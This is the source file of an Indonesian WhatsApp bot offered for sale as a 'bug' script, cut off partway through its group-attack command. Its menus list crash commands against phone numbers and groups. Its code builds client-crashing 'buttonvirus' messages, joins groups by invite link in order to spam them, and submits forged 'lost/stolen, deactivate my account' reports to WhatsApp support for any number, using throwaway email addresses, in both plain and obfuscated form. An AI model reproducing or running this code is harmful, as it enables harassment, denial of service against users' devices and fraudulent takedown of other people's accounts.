const { modul } = require('./module');
const { axios, baileys, chalk, cheerio, child_process, crypto, fs, ffmpeg, jsobfus, moment, ms, speed, util } = modul;
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, reSize, generateProfilePicture } = require('./lib/myfunc')
const { buttonvirus } = require('./scrape/buttonvirus')
const os = require('os')
const { color, bgcolor } = require('./lib/color')
const { uptotelegra } = require('./scrape/upload')
const tiktok = require('./scrape/tiktok')
const audionye = fs.readFileSync('./y.mp3')
const audio = fs.readFileSync('./catoz.mp3') 
const owner = JSON.parse(fs.readFileSync('./database/owner.json').toString())

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {},
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}
global.ownerName = 'ððĒm/ctz'
global.ownerNumber = ["081938830020@s.whatsapp.net"]
global.prefa = ['','.']
global.mess = {
wait: 'Wait Sis Please be patient',
succes: 'Good Luck Sis ?',
admin: 'Group Admin Special Features!!!',
botAdmin: 'Bots Must Be Admins First!!!',
owner: 'Lu Siapa Kocak?',
group: 'Features Used Only For Groups!!!',
private: 'Features Used Only For Private Chat!!!',
bot: 'Bot Number User Special Features!!!',
error: 'Error Sis, Please Chat Owner...',
}

module.exports = diablo = async (diablo, diablobotwhatsapp, chatUpdate, store) => {
try {
const body = (diablobotwhatsapp.mtype === 'conversation') ? diablobotwhatsapp.message.conversation : (diablobotwhatsapp.mtype == 'imageMessage') ? diablobotwhatsapp.message.imageMessage.caption : (diablobotwhatsapp.mtype == 'videoMessage') ? diablobotwhatsapp.message.videoMessage.caption : (diablobotwhatsapp.mtype == 'extendedTextMessage') ? diablobotwhatsapp.message.extendedTextMessage.text : (diablobotwhatsapp.mtype == 'buttonsResponseMessage') ? diablobotwhatsapp.message.buttonsResponseMessage.selectedButtonId : (diablobotwhatsapp.mtype == 'listResponseMessage') ? diablobotwhatsapp.message.listResponseMessage.singleSelectReply.selectedRowId : (diablobotwhatsapp.mtype == 'templateButtonReplyMessage') ? diablobotwhatsapp.message.templateButtonReplyMessage.selectedId : (diablobotwhatsapp.mtype === 'messageContextInfo') ? (diablobotwhatsapp.message.buttonsResponseMessage?.selectedButtonId || diablobotwhatsapp.message.listResponseMessage?.singleSelectReply.selectedRowId || diablobotwhatsapp.text) : ''
const budy = (typeof diablobotwhatsapp.text == 'string' ? diablobotwhatsapp.text : '')
const prefix = prefa ? /^[Â°âĒÏÃ·ÃÂķâÂĢÂĒâŽÂĨÂŪ=????+â_=|~!?@#%^&.ÂĐ^]/gi.test(body) ? body.match(/^[Â°âĒÏÃ·ÃÂķâÂĢÂĒâŽÂĨÂŪ=????+â_=|~!?@#%^&.ÂĐ^]/gi)[0] : "" : prefa ?? global.prefix
const content = JSON.stringify(diablobotwhatsapp.message)
const { type, quotedMsg, mentioned, now, fromMe } = diablobotwhatsapp
const isCmd = body.startsWith(prefix)
const from = diablobotwhatsapp.key.remoteJid
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = diablobotwhatsapp.pushName || "No Name"
const botNumber = await diablo.decodeJid(diablo.user.id)
const itsMediablo = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(diablobotwhatsapp.sender)
const itsMe = diablobotwhatsapp.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = diablobotwhatsapp.quoted ? diablobotwhatsapp.quoted : diablobotwhatsapp
const mime = (quoted.msg || quoted).mimetype || ''
const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
		const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
		const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')  
const isMedia = /image|video|sticker|audio/.test(mime)
const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedMsg = (type == 'extendedTextMessage')
		const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
		const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
		const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
		const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
		const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false
const hariRaya = new Date('January 1, 2023 00:00:00')
const sekarang = new Date().getTime()
const Selisih = hariRaya - sekarang
const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
const jmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60))
const jdetik = Math.floor( Selisih % (1000 * 60) / 1000)
const sender = diablobotwhatsapp.isGroup ? (diablobotwhatsapp.key.participant ? diablobotwhatsapp.key.participant : diablobotwhatsapp.participant) : diablobotwhatsapp.key.remoteJid
 const isGroup = diablobotwhatsapp.chat.endsWith('@g.us')
const groupMetadata = diablobotwhatsapp.isGroup ? await diablo.groupMetadata(diablobotwhatsapp.chat).catch(e => {}) : ''
const groupName = diablobotwhatsapp.isGroup ? groupMetadata.subject : ''
const participants = diablobotwhatsapp.isGroup ? await groupMetadata.participants : ''
const groupAdmins = diablobotwhatsapp.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = diablobotwhatsapp.isGroup ? groupMetadata.owner : ''
const groupMembers = diablobotwhatsapp.isGroup ? groupMetadata.participants : ''
	const isBotAdmins = diablobotwhatsapp.isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = diablobotwhatsapp.isGroup ? groupAdmins.includes(diablobotwhatsapp.sender) : false
	const isAdmins = diablobotwhatsapp.isGroup ? groupAdmins.includes(diablobotwhatsapp.sender) : false
	
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[diablobotwhatsapp.sender]
if (typeof user !== 'object') global.db.users[diablobotwhatsapp.sender] = {}
const chats = global.db.chats[diablobotwhatsapp.chat]
if (typeof chats !== 'object') global.db.chats[diablobotwhatsapp.chat] = {}
} catch (err) {
console.error(err)
}

if (!diablo.public) {
if (!diablobotwhatsapp.key.fromMe) return
}

if (!diablobotwhatsapp.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(diablobotwhatsapp.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname))
}
if (diablobotwhatsapp.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(diablobotwhatsapp.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
}

if (diablobotwhatsapp.sender.startsWith('212')) return diablo.updateBlockStatus(diablobotwhatsapp.sender, 'block')

ppuser = 'https://raw.githubusercontent.com/JasRunJ/filenya/master/a4cab58929e036c18d659875d422244d.jpg'
ppnyauser = await reSize(ppuser, 200, 200)

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${buttonvirus}`, 
"jpegThumbnail": ppnyauser
}
}
}

if (command) {
diablo.sendPresenceUpdate('composing', from)
diablo.readMessages([diablobotwhatsapp.key])
}

async function replyNya(teks) {
   const buttonsDefault = [{ quickReplyButton: { displayText : `${buttonvirus}`, id : `.menu` } }] 
   const buttonMessage = { 
text: teks, 
footer: "", 
templateButtons: buttonsDefault, 
image: {url: ppnyauser}   
   }
   return diablo.sendMessage(from, buttonMessage)
}

async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true,
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `diablo`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

async function styletext(teks) {
return new Promise((resolve, reject) => {
axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
.then(({ data }) => {
let $ = cheerio.load(data)
let hasil = []
$('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
})
resolve(hasil)
})
})
}

async function sendBugcrash(jid, title, description, footer, thumbnail, ownerBusines, produk, productIdImg) {
let prod = {
listMessage: {
title: title,
description: description,
listType: 2,
productListInfo: {
productSections: [{
title: title,
products: produk
}],
headerImage: {
productId: productIdImg,
jpegThumbnail: thumbnail
},
businessOwnerJid: ownerBusines
},
footerText: footer,
}
}
let progene = await generateWAMessageFromContent(jid, prod, { quoted : lep })
return diablo.relayMessage(progene.key.remoteJid, progene.message, {
messageId: ""
})
}
switch (command) {
case 'bugmenu':
case 'help':
case 'menu':
jiren = `
ââââą ðâð―ð ðđðð 
âĢâ áī áīĘęąÉŠáīÉī : v3
âĢâ áīĘáīáīáīáīĘ : 6281938830020
âĢâ áīĘáīáīáīáīĘ1 : 6281998199848
âĢâ Ęáīáī Éīáīáīáī : Rilbot
âĢâ áīáīĄÉīáīĘ Éīáīáīáī : Owner
âĢâ ĘáīÉīÉīÉŠÉīÉĒ : web
âĢâ Runtimeðŧ : ${runtime(process.uptime())} 
ââââą
â­âââĒâšã ððððð ã
âĢãhidetag ( untuk tag member }
âĢãRestart ( untuk restart bot )
âĢãStats ( untuk melihat status bot )
âĢãAkses ( untuk beli akses )
âĢãSewa ( untuk sewabot dalam grup )
â°ââââĪ 
ââââââââââââââââââââââ
âŽâ­âŽâ­âŽâ­âŽâ­âŽâŽâ­âŽâ­âŽ
â âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
ââââą ððžâð ððâðžâ
âĢâ Sewa ( Cek Sewa ) 
âĢâ Script ( Source Code ) 
âĢâ Ping ( Untuk Cek Status )
âĢâ Restart ( Mereset Bot ) 
âĢâ Addakses @628ð­ð­ð­
âĢâ Delakses @628ð­ð­ð­
ââââą
ââââąðļðððļâð ðžðððð
âĢãðĨķ 628ð­ð­ð­ð­
âĢãð 628ð­ð­ð­ð­
âĢãðĨĩ 628ð­ð­ð­ð­
âĢãðŋ 628ð­ð­ð­ð­
âĢãðĶ 628ð­ð­ð­ð­
âĢãðĨ 628ð­ð­ð­ð­
âĢãðŧ 628ð­ð­ð­ð­
âĢãâ 628ð­ð­ð­ð­
âĢãð· 628ð­ð­ð­ð­
âĢãðž 628ð­ð­ð­ð­
âĢãâ ïļ 628ð­ð­ð­ð­
âĢãã―ïļ 628ð­ð­ð­ð­
âĢãâĒïļ 628ð­ð­ð­ð­
ïļâĢãðĨ 628ð­ð­ð­ð­
âĢãðą 628ð­ð­ð­ð­
âĢãðķ ïļ628ð­ð­ð­ð­
âĢãðĨ 628ð­ð­ð­ð­
âĢãðū 628ð­ð­ð­ð­
âĢãðą 628ð­ð­ð­ð­
âĢãðļ ïļ628ð­ð­ð­ð­
âĢãðĢ 628ð­ð­ð­ð­
âĢãð° 628ð­ð­ð­ð­
ââââą
ââââââââââââââââââą 
âĢâ ðððŽðŪðĪðð§ ð§ðĻðĶðĻðŦ ð­ððŦð ðð­
âĢâ ððĻð§ð­ðĻðĄ ðĢ 6285817397
ââââââââââââââââââą
ââââą ð―ðð ðððð ð
âĢãkursihijau 62xxx
âĢãalokhamil 62xxx
âĢãbantengmerah 62xxx
ââââą
ââââąððžâðð―ð âðððđðžâ ðĨķ
âĢãVerify 628ð­ð­ð­ð­
âĢãLogout 628ð­ð­ð­ð­
âĢãResetotp 628ð­ð­ð­ð­
âĢãKenonwa 628ð­ð­ð­ð­
âĢãBanned 628ð­ð­ð­ð­
âĢãUnbanned 628ð­ð­ð­ð­
ââââą
ââââą ðļðððļâð ððļMâĪZ â ïļ
âĢãBugsanzz1 628ð­ð­ð­ð­
âĢãBugsanzz2 628ð­ð­ð­ð­
âĢãBugsanzz3 628ð­ð­ð­ð­
âĢãBugsanzz4 628ð­ð­ð­ð­
âĢãBugsanzz5 628ð­ð­ð­ð­
âĢãBugsanzz6 628ð­ð­ð­ð­
âĢãBugsanzz7 628ð­ð­ð­ð­
âĢãBugsanzz8 628ð­ð­ð­ð­
âĢãBugsanzz9 628ð­ð­ð­ð­
ââââą
ââââą ðļðððļâð âðððđðžâ ð
âĢãKill 628ð­ð­ð­ð­
âĢãDor 628ð­ð­ð­ð­
âĢãTroli 628ð­ð­ð­ð­
âĢãTuru 628ð­ð­ð­ð­
âĢãBom 628ð­ð­ð­ð­
âĢãTrava 628ð­ð­ð­ð­
âĢãCrash 628ð­ð­ð­ð­
âĢãBrutal 628ð­ð­ð­ð­
âĢãGassan 628ð­ð­ð­ð­
âĢãSantet 628ð­ð­ð­ð­
âĢãJagoan 628ð­ð­ð­ð­
âĢãMental 628ð­ð­ð­ð­
âĢãKatalog 628ð­ð­ð­ð­
âĢãDarkness 628ð­ð­ð­ð­
ââââą
ââââą ðļðððļâð ðūâððâ ðĨ
âĢãKillgc linkgrup
âĢãPolgc linkgrup
âĢãDorgc linkgrup
âĢãGasgc linkgrup
âĢãKntlgc linkgrup
âĢãmatigc linkgrup
âĢãBomgc linkgrup
âĢãSantetgc linkgrup
ââââą`

diablobotwhatsapp.reply(jiren)
break
case 'owner':
owner1 =`
â­âââĒâšã ððððð ã
â  hidetag ( untuk tag member }
â  Restart ( untuk restart bot )
â  Stats ( untuk melihat status bot )
â  Akses ( untuk beli akses )
â  Sewa ( untuk sewabot dalam grup )
â°ââââĪ 
`
diablobotwhatsapp.reply(owner1)
break
case 'sewa':
textsewa = `
â­âââĒâšã ððððž ð―ðð ã
â  Akses Bot 5K
â  Sewa Bot 11K /Minggu
â  Sewa Permanen 25K
â  Sc Bot? 40K
â  http://wa.me/6281938830020
â°ââââĪ 

`
diablobotwhatsapp.reply(textsewa)
break
case 'infosc': 
case 'scrip':
case 'sc':
textinfosc =`
â­âââĒâšã ððððððū ã
â : *Script Update* : V3
â : *Di Buat By* : sam/ctz
â : *Nama sc* :  BUG VIP Samzz
â : *Total Fitur* : (99) fhl.dx17
â : *Buy Sc*  : 6281938830020
â°ââââĪ 
`
diablobotwhatsapp.reply(textinfosc)
break
case 'tag':
case 'hidetag': {
 if (!itsMediablo) return diablobotwhatsapp.reply(`Own only`)
   
diablo.sendMessage(diablobotwhatsapp.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: diablobotwhatsapp })
}
break

case 'restart':{
 if (!isGroup) return diablobotwhatsapp.reply("wajip dalam grup")
if (!isGroupAdmins) return diablobotwhatsapp.reply("Own only")
txts = "SUCCES KAK"
diablobotwhatsapp.reply(txts)
 let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
  let o
  try {
  o = exec('pm2 restart all')
  } catch (e) {
  o = e
 } finally {
let { stdout, stderr } = o
}
}
break
case 'add':
case 'addakses':
 if (!isGroup) return diablobotwhatsapp.reply("wajib dalam grup")
if (!isGroupAdmins) return diablobotwhatsapp.reply("Own only") 

if (!args[0]) return diablobotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await diablo.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
diablobotwhatsapp.reply(`Nomor ${bnnd} Sudah Bisa Akses!!!`)
break
case 'del':
case 'delakses':
if (!isGroup) return diablobotwhatsapp.reply(`wajib dalam grup`)
if (!isGroupAdmins) return diablobotwhatsapp.reply(`Own only`)

if (!args[0]) return diablobotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
diablobotwhatsapp.reply(`Nomor ${ya} Sudah Tidak Bisa Akses Bot`)
break
case 'tag': {
 if (!itsMediablo) return diablobotwhatsapp.reply(`Own only`)
   
diablo.sendMessage(diablobotwhatsapp.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: diablobotwhatsapp })
}
break
case 'test':
case 'ping':
case 'stats':{
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \nRuntime : ${runtime(process.uptime())}
ðŧ Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
`
diablobotwhatsapp.reply(respon)
}
break
case 'resetotp':{
const _0x3b2a5a=_0x5af2;function _0x31f7(){const _0x33b497=['platform','input[name=lsd]','12MHgmQc','action','https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10','val','input[name=jazoest]','142992HUxvWm','replace','19316.BP:whatsapp_www_pkg.2.0.0.0.0','2VYdelG','parse','POST','lsd','data','13709421eibQzs','attr','\x20628xxxx','Owner\x20Only','55080190yQJkjs','__rev','set-cookie','append','jazoest','__csr','axios','join','find','country_selector','__a','href','load','headers','180oZPrEI','__user','ANDROID','Contoh:\x0a','4391359qTfUVO','form','3662340pvQnPQ','Por\x20favor,\x20pesquise\x20o\x20cÃģdigo\x20OTP\x20para\x20este\x20nÃšmero\x20porque\x20outra\x20pessoa\x20acidentalmente\x20se\x20conectou\x20com\x20meu\x20nÃšmero\x20e\x20eu\x20tive\x20que\x20esperar\x208\x20horas,\x20por\x20favor,\x20pesquise\x20novamente\x20neste\x20nÃšmero','dpr','__hs','for\x20(;;);','format','your_message','10onCZBX','step','submit','159120whDQpu','6281236167286','get','1298062FCMQJX','reply'];_0x31f7=function(){return _0x33b497;};return _0x31f7();}(function(_0x381f89,_0x3b7b4b){const _0x361d3f=_0x5af2,_0x4113fe=_0x381f89();while(!![]){try{const _0x176624=parseInt(_0x361d3f(0x1f7))/0x1*(-parseInt(_0x361d3f(0x203))/0x2)+-parseInt(_0x361d3f(0x220))/0x3+-parseInt(_0x361d3f(0x21a))/0x4*(parseInt(_0x361d3f(0x1f4))/0x5)+parseInt(_0x361d3f(0x1fb))/0x6*(parseInt(_0x361d3f(0x21e))/0x7)+-parseInt(_0x361d3f(0x200))/0x8+-parseInt(_0x361d3f(0x208))/0x9+-parseInt(_0x361d3f(0x1f1))/0xa*(-parseInt(_0x361d3f(0x20c))/0xb);if(_0x176624===_0x3b7b4b)break;else _0x4113fe['push'](_0x4113fe['shift']());}catch(_0x1a64da){_0x4113fe['push'](_0x4113fe['shift']());}}}(_0x31f7,0xbbf6b));if(!isCreator)return msg[_0x3b2a5a(0x1f8)](_0x3b2a5a(0x20b));if(!q)return msg[_0x3b2a5a(0x1f8)](_0x3b2a5a(0x21d)+(prefix+command)+_0x3b2a5a(0x20a));if(q==_0x3b2a5a(0x1f5))return;const axioss=require(_0x3b2a5a(0x212));let ntah=await axioss[_0x3b2a5a(0x1f6)]('https://www.whatsapp.com/contact/noclient/'),email=await axioss[_0x3b2a5a(0x1f6)](_0x3b2a5a(0x1fd)),cookie=ntah[_0x3b2a5a(0x219)][_0x3b2a5a(0x20e)][_0x3b2a5a(0x213)](';\x20'),$=cheerio[_0x3b2a5a(0x218)](ntah[_0x3b2a5a(0x207)]),$form=$(_0x3b2a5a(0x21f)),url=new URL($form[_0x3b2a5a(0x209)](_0x3b2a5a(0x1fc)),'https://www.whatsapp.com')[_0x3b2a5a(0x217)],form=new URLSearchParams();form[_0x3b2a5a(0x20f)](_0x3b2a5a(0x210),$form[_0x3b2a5a(0x214)](_0x3b2a5a(0x1ff))[_0x3b2a5a(0x1fe)]()),form[_0x3b2a5a(0x20f)](_0x3b2a5a(0x206),$form[_0x3b2a5a(0x214)](_0x3b2a5a(0x1fa))[_0x3b2a5a(0x1fe)]()),form[_0x3b2a5a(0x20f)](_0x3b2a5a(0x1f2),_0x3b2a5a(0x1f3)),form['append'](_0x3b2a5a(0x215),'ID'),form[_0x3b2a5a(0x20f)]('phone_number',q),form['append']('email',email[_0x3b2a5a(0x207)][0x0]),form[_0x3b2a5a(0x20f)]('email_confirm',email[_0x3b2a5a(0x207)][0x0]),form[_0x3b2a5a(0x20f)](_0x3b2a5a(0x1f9),_0x3b2a5a(0x21c)),form['append'](_0x3b2a5a(0x226),_0x3b2a5a(0x221)),form[_0x3b2a5a(0x20f)](_0x3b2a5a(0x21b),'0'),form[_0x3b2a5a(0x20f)](_0x3b2a5a(0x216),'1'),form['append'](_0x3b2a5a(0x211),''),form[_0x3b2a5a(0x20f)]('__req','8'),form[_0x3b2a5a(0x20f)](_0x3b2a5a(0x223),_0x3b2a5a(0x202)),form[_0x3b2a5a(0x20f)](_0x3b2a5a(0x222),'1'),form['append']('__ccg','UNKNOWN'),form[_0x3b2a5a(0x20f)](_0x3b2a5a(0x20d),'1006630858'),form[_0x3b2a5a(0x20f)]('__comment_req','0');let res=await axioss({'url':url,'method':_0x3b2a5a(0x205),'data':form,'headers':{'cookie':cookie}});function _0x5af2(_0x3a5d05,_0x2cab71){const _0x31f71d=_0x31f7();return _0x5af2=function(_0x5af2d9,_0x40ede5){_0x5af2d9=_0x5af2d9-0x1f1;let _0xee10e9=_0x31f71d[_0x5af2d9];return _0xee10e9;},_0x5af2(_0x3a5d05,_0x2cab71);}msg[_0x3b2a5a(0x1f8)](util[_0x3b2a5a(0x225)](JSON[_0x3b2a5a(0x204)](res[_0x3b2a5a(0x207)][_0x3b2a5a(0x201)](_0x3b2a5a(0x224),''))));
}
break
case 'logout':
case 'verify':
case 'resetotp':
case 'kenonwa':
case 'banned': {
  var axioss = require ("axios")
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
diablobotwhatsapp.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
break
case 'santetgc':
case 'bomgc':
case 'matigc':
case 'kntlgc':
case 'gasgc':
case 'dorgc':
case 'polgc':
case 'killgc':
  case 'seranggc':{ 
   if (!itsMediablo) return diablobotwhatsapp.reply(`Own only`)
if (!isGroupAdmins) return diablobotwhatsapp.reply(`Own only`)
if (!q) return reply(`Penggunaan ${prefix+command} link`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
let jumlah = "17"
for (let i = 0; i < jumlah; i++) {
let kir = await diablo.groupAcceptInvite(result)
diablo.sendMessage(kir, {
text: 'BUG BY ððĒðŊðŧðŧ', 
templateButtons: [
   { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
